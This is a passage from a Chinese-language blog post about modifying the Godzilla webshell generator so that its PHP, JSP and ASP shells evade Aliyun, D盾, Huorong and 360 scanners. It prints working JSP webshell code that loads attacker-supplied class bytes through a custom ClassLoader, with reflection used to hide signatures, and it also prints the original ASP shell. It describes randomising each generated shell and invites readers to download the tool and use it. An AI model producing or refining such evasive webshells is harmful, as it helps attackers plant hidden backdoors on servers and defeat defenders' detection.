alt="image-20241118182735288"></p><p>阿里云报了可疑，没有绕过去。这个eval没有过去</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120152721804.png" alt="image-20241120152721804"></p><p>好，php的免杀就先到这里吧。奈何笔者太菜了，动态的webshell查杀都过不去。</p><p>笔者在测试php5的时候，发现<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153557064.png" alt="image-20241120153557064"></p><p>http_response_code(404);这行代码时报错的</p><p>在php官网看，发现http_response_code只在(PHP 5 &gt;= 5.4.0, PHP 7, PHP 8)支持。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153706885.png" alt="image-20241120153706885"></p><p>不过，下面在十一年前，有大牛已经给出了解决方法，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153831577.png" alt="image-20241120153831577"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120153956079.png" alt="image-20241120153956079"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241120154307563.png" alt="image-20241120154307563"></p><p>好，这里我们就改完了。</p><p>用笔者开的这个工具，你会发现，每次生成的🐎都是一样的，注释什么的，和变量名，都一样。</p><p>我们想办法给他写一下，然他变动起来。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110329067.png" alt="image-20241122110329067"></p><p>我们在原版中可以看到，读取哥斯拉默认生成模板bin文件后，会替换pass 和key。</p><p>那么相应的，我们定义几个变量，让他随机替换即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110501144.png" alt="image-20241122110501144"></p><p>首先我们在方法里定义一个数组，然后进行随机排序，然后再给他拿出来用，就可以了。这里用了几个字符串。然后分别进行替换掉。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122110649176-17322448095041.png" alt="image-20241122110649176"></p><p>我们再在bin文件中，写上相应的所需要替换的字符串，这样就可以了。打包，编译。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122111132618.png" alt="image-20241122111132618"></p><p>这样，我们每次生成的木马就不一样了。就动态了。但是其实总体结构还是不变的。变得只是变量。</p><p>没事，能用就行，后面在优化。好了 php的免杀就先做到这里，下面是jsp的。</p><h5 id="jsp-免杀"><a href="#jsp-免杀" class="headerlink" title="jsp 免杀"></a>jsp 免杀</h5><p>环境：Apache Tomcat/9.0.65</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122143604309.png" alt="image-20241122143604309"></p><p>上来就是已知后门，那么肯定是被匹配到了关键字，fuzz一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144122631.png" alt="image-20241122144122631"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144144439.png" alt="image-20241122144144439"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122144208689.png" alt="image-20241122144208689"></p><p>在两次的🐎中可以看到，应该是匹配了cipher。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152115554.png" alt="image-20241122152115554"></p><p>这里给他换成Unicode还是报，那可能还有关键词。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152702167.png" alt="image-20241122152702167"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122152725481.png" alt="image-20241122152725481"></p><p>aes也有问题。ok,也给他编码一下，下半部分也有问题，改改。<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122155044933.png" alt="image-20241122155044933"></p><p>我们在改这个的时候发现就算有这一句，也报已知，那说明，这个里面的\u啥啥啥的也被标记了。</p><p>我们在测试的时候，发现阿里云拦截的，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125100859587-17325005401581.png" alt="image-20241125100859587"></p><p>这种反射加载类的   invoke方式肯定是被拦截的。所以，我们让gpt帮我们写一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101509813.png" alt="image-20241125101509813"></p><p>就类似于这种。这样的话，阿里云就不报了。</p><p>原本的哥斯拉分两半部分，上部分为定义的各种方法。如md5 base64 en decode  aes等，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101657763.png" alt="image-20241125101657763"></p><p>下半部分为，正真的传参逻辑。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101749460.png" alt="image-20241125101749460"></p><p>我们让gpt帮我们改一下，上半部分，用反射机制，并且避免invoke出现。</p><p>左边为没有下班部分，右边是有的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101919130.png" alt="image-20241125101919130"></p><p>可以看到，上半部分已经没有问题了，下半部分还是有问题，放一下🐎。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125102230478.png" alt="image-20241125102230478"></p><p>阿里云也报，他是报的f.equals(pageContext);。那我们再改一下。🐎的核心逻辑。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! </span><br><span class="line">    String xc = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line">    String pass = <span class="string">&quot;pass&quot;</span>; </span><br><span class="line">    String md5 = md5(pass + xc); </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(z);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">       <span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(<span class="keyword">null</span>, cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="comment">// 可以在这里捕获并处理异常</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] x(<span class="keyword">byte</span>[] s, <span class="keyword">boolean</span> m) &#123; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取 Cipher 类</span></span><br><span class="line">        Class&lt;?&gt; cipherClass = Class.forName(<span class="string">&quot;javax.crypto.Cipher&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.getInstance(&quot;AES&quot;) 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method getInstanceMethod = cipherClass.getMethod(<span class="string">&quot;getInstance&quot;</span>, String.class);</span><br><span class="line">        Object cipher = getInstanceMethod.invoke(<span class="keyword">null</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 SecretKeySpec 类并创建对象</span></span><br><span class="line">        Class&lt;?&gt; secretKeySpecClass = Class.forName(<span class="string">&quot;javax.crypto.spec.SecretKeySpec&quot;</span>);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; secretKeySpecConstructor = secretKeySpecClass.getConstructor(<span class="keyword">byte</span>[].class, String.class);</span><br><span class="line">        Object key = secretKeySpecConstructor.newInstance(xc.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.init 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method initMethod = cipherClass.getMethod(<span class="string">&quot;init&quot;</span>, <span class="keyword">int</span>.class, java.security.Key.class);</span><br><span class="line">        initMethod.invoke(cipher, m ? <span class="number">1</span> : <span class="number">2</span>, key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 Cipher.doFinal 方法并调用</span></span><br><span class="line">        java.lang.reflect.Method doFinalMethod = cipherClass.getMethod(<span class="string">&quot;doFinal&quot;</span>, <span class="keyword">byte</span>[].class);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>[]) doFinalMethod.invoke(cipher, (Object) s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 java.util.Base64</span></span><br><span class="line">            java.util.Base64.Encoder encoder = java.util.Base64.getEncoder();</span><br><span class="line">            <span class="keyword">return</span> encoder.encodeToString(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 避免 invoke 直接使用 Base64 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 java.util.Base64</span></span><br><span class="line">            java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();</span><br><span class="line">            <span class="keyword">return</span> decoder.decode(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>知道哪里有问题，就好改了。</p><p>我们直接在d盾处删了  阿里云报的  f.是不行的，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125103728559.png" alt="image-20241125103728559"></p><p>改了一下变量名，也不行。</p><p>经过一天的测试，发现，好像绕不过阿里云了。，太菜了。先这样。</p><p>aliyun会匹配f.equals(pageContext);</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125172132547.png" alt="image-20241125172132547"></p><p>改成unicode也不行，aliyun是动态的，他会运行。其他的都用反射写好了。</p><p>哦，对了，还有一点就是这个defineClass(null, cb, 0, cb.length);方法。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125175603511.png" alt="image-20241125175603511"></p><p><a href="https://xz.aliyun.com/t/11368">https://xz.aliyun.com/t/11368</a></p><p>在这篇大师傅的文章中，详细说了这个，哥斯拉和冰蝎都是这样的需要defineClass方法来加载恶意类字节码，似乎需要自定义ClassLoader来绕过了。或者改payload了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180907351.png" alt="image-20241125180907351"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180031255.png" alt="image-20241125180031255"></p><p>下面的评论中，也写了，单文件不好过阿里云了。需要分离了。笔者太菜了，后面在研究。</p><p>接下来看下半部分，在看了大量哥斯拉免杀马的教程后发现，d盾我也没过去。下面就记录一下。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">        data = x(data, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">            java.io.ByteArrayOutputStream arrOut = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">            Object f = ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="keyword">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这是下半部分，主要的查杀点是<code>session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</code></p><p>准确的来说是getClassLoader这个字符串。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126114939630.png" alt="image-20241126114939630"></p><p>这里直接将这个字符串删掉，完全没有问题。</p><p><a href="https://www.freebuf.com/sectool/386231.html">https://www.freebuf.com/sectool/386231.html</a></p><p>在这篇大师傅的文章中说，将<code>this.getClass().getClassLoader() 可替换为Thread.currentThread().getContextClassLoader()</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115039932.png" alt="image-20241126115039932"></p><p>但是，我们惊奇的发现，getContextClassLoader()  也是存在ClassLoader 所以过不去。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115332909.png" alt="image-20241126115332909"></p><p>为了gpt，发现，无论怎么获取，都需要有ClassLoader()这个字符，那么就走到了死胡同。</p><p>还有一种方法，就是自己写了，那么我们先搁下，后面在研究（其实就是笔者不会，等我研究研究的）。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115454282.png" alt="image-20241126115454282"></p><p>那么还有一种方法就是混淆了，混淆就是用unicode编码。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115901247.png" alt="image-20241126115901247"></p><p>但是你会发现，有unicode编码。  直接就报，也不管里面是啥。所以暂时我的路给堵死了。</p><p>最后我们就用unicode编码吧，报就报吧，总比报可疑好看一点。</p><p>这样的话，我们的模板就写好了。</p><p>试试火绒和360 ，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145648688.png" alt="image-20241126145648688"></p><p>这里传值的时候，是payload就不行，火绒和360都报，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145952249.png" alt="image-20241126145952249"></p><p>随便写个字符串，即可了。在改改变量名，就不演示了。好，这一我们的模板就彻底完事了。</p><p>放到哥斯拉里的bin文件就行。</p><p>当然，我们的bin文件需要改一改。由于，哥斯拉默认jsp形式的生成代码是两段，所以我们需要都改一下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127112917794.png" alt="image-20241127112917794"></p><p>把这些str写一下，在主generate中，写一些字符串，然后在生成代码时候进行替换就可以了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113002060.png" alt="image-20241127113002060"></p><p>这个活看起来确实不是很难，但是需要很细，改了一天，错一点又要重新删了在替换，心态快崩了。</p><p>这里细心的同学会发现，我将原本默认的哥斯拉生成的pass 和 key进行base64了。</p><p>就是在这个地方</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113248451.png" alt="image-20241127113248451"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113341743.png" alt="image-20241127113341743"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113548405.png" alt="image-20241127113548405"></p><p>在生成木马中，就找不到原来的pass 和一个16位的字符了，增加一丢丢迷惑性吧</p><p>原本的马中，是有md5函数的，但是这个没有，因为用不到，就给删了。</p><p>当然，其中也加了一些其他的东西。这里就不细讲了，防止暴漏，能让大家多用一会。</p><p>回到免杀，是的，也过掉了d盾，笔者上面说到的  gpt帮我们找了一些函数，但是都有classcload 过不去，其实不是，经过测试发现，这个是有可以代替的。gpt太强了。这里就不写改过哪里了。大家下载了直接用就好。下个版本在揭露，目前我看网上还没有这种用法。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113840202.png" alt="image-20241127113840202"></p><p>这样呢，我们就过掉了d盾，希望d盾的作者不要看到这个文章，这样的话，就能一直用了。</p><p>好了，这样就可以了。暂时先用着，看下效果。</p><p>没次生成的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127135106715.png" alt="image-20241127135106715"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142342625.png" alt="image-20241127142342625"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142358575-17326886738532.png" alt="image-20241127142358575"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142435205.png" alt="image-20241127142435205"></p><p>ok，没有问题，这样jsp的免杀就完成了。大家在使用的时候，尽量别用pass 和key做密码，太明显了。下面咱们来看asp的。</p><h5 id="asp-免杀"><a href="#asp-免杀" class="headerlink" title="asp 免杀"></a>asp 免杀</h5><p>先看一下原版的🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)</span><br><span class="line"></span><br><span class="line">Function Base64Decode(ByVal vCode)</span><br><span class="line">    Dim oXML, oNode</span><br><span class="line">    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)</span><br><span class="line">    Set oNode = oXML.CreateElement(&quot;base64&quot;)</span><br><span class="line">    oNode.dataType = &quot;bin.base64&quot;</span><br><span class="line">    oNode.text = vCode</span><br><span class="line">    Base64Decode = oNode.nodeTypedValue</span><br><span class="line">    Set oNode = Nothing</span><br><span class="line">    Set oXML = Nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function decryption(content,isBin)</span><br><span class="line">    dim size,i,result,keySize</span><br><span class="line">    keySize = len(key)</span><br><span class="line">    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    BinaryStream.CharSet = &quot;iso-8859-1&quot;</span><br><span class="line">    BinaryStream.Type = 2</span><br><span class="line">    BinaryStream.Open</span><br><span class="line">    if IsArray(content) then</span><br><span class="line">        size=UBound(content)+1</span><br><span class="line">        For i=1 To size</span><br><span class="line">            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))</span><br><span class="line">        Next</span><br><span class="line">    end if</span><br><span class="line">    BinaryStream.Position = 0</span><br><span class="line">    if isBin then</span><br><span class="line">        BinaryStream.Type = 1</span><br><span class="line">        decryption=BinaryStream.Read()</span><br><span class="line">    else</span><br><span class="line">        decryption=BinaryStream.ReadText()</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line">    key=&quot;3c6e0b8a9c15224a&quot;</span><br><span class="line">    content=request.Form(&quot;pass&quot;)</span><br><span class="line">    if not IsEmpty(content) then</span><br><span class="line"></span><br><span class="line">        if  IsEmpty(Session(&quot;payload&quot;)) then</span><br><span class="line">            content=decryption(Base64Decode(content),false)</span><br><span class="line">            Session(&quot;payload&quot;)=content</span><br><span class="line">            response.End</span><br><span class="line">        else</span><br><span class="line">            content=decryption(Base64Decode(content),true)</span><br><span class="line">            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)</span><br><span class="line">            Execute(bypassDictionary(&quot;payload&quot;))</span><br><span class="line">            result=run(content)</span><br><span class="line">            response.Write(&quot;11cd6a&quot;)</span><br><span class="line">            if not IsEmpty(result) then</span><br><span class="line">                response.Write Base64Encode(decryption(result,true))</span><br><span class="line">            end if</span><br><span class="line">            response.Write(&quot;ac826a&quot;)</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们会发现Execute(bypassDictionary(“payload”))  这一句肯定是检查的重点了。经过看文章，一共就三个执行命令的函数，</p><p>Eval</p><p>Execute</p><p>ExecuteGlobal</p><p>大概率是不好过了。asp可以使用chr（97）这种方式进行混淆关键字。但是eval这种不可以。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127173004460.png" alt="image-20241127173004460"></p><p>类似这种。字符串和chr拼接。</p><p>大概这样</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172721137.png" alt="image-20241203172721137"></p><p>看一下查杀效果，首先看最强的阿里云</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203171242474.png" 